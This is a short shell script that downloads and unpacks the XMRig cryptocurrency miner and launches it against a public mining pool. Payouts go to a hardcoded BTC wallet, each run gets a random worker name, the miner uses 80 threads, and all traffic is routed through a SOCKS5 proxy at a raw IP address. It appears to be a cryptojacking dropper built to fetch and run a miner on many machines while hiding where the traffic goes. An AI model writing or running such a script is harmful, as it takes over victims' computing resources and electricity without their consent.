#!/bin/bash
#!/bin/sh
#!/bin/bash

wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar -xf xmrig-6.18.0-linux-x64.tar.gz
chmod +x xmrig-6.18.0
cd xmrig-6.18.0
chmod +x xmrig
./xmrig -a rx/0 -o rx.unmineable.com:3333 -u BTC:3ADSo91zeFJbJ5zDCacuJLmr58K1J75F41.$(echo $(shuf -i 1-999 -n 1)-CPU) -p 99 -t 80 --keepalive --dns-ipv6 -x socks5://192.252.214.20:15864
